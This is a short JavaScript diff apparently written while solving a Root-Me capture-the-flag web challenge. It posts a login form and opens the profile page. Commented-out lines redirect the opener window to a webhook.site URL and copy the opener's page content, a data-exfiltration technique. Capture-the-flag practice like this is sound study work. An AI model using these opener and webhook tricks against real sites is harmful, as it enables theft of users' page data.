@@ -7,13 +7,7 @@ fetch('http://challenge01.root-me.org:58003/login', {
   method: 'POST',
   body: formData
 })
-.then(res => res.text())
-.then(response => {
-  console.log('Réponse du serveur :', response);
-})
-.catch(err => {
-  console.error('Erreur :', err);
-});
+.then(res => res.text());
 window.open('http://challenge01.root-me.org:58003/profile');
 //opener.location = "https://webhook.site/fad3c06f-ed8b-4d27-b880-98f3e78d5a18";
 //document.body.innerHTML=opener.document.body.innerHTML
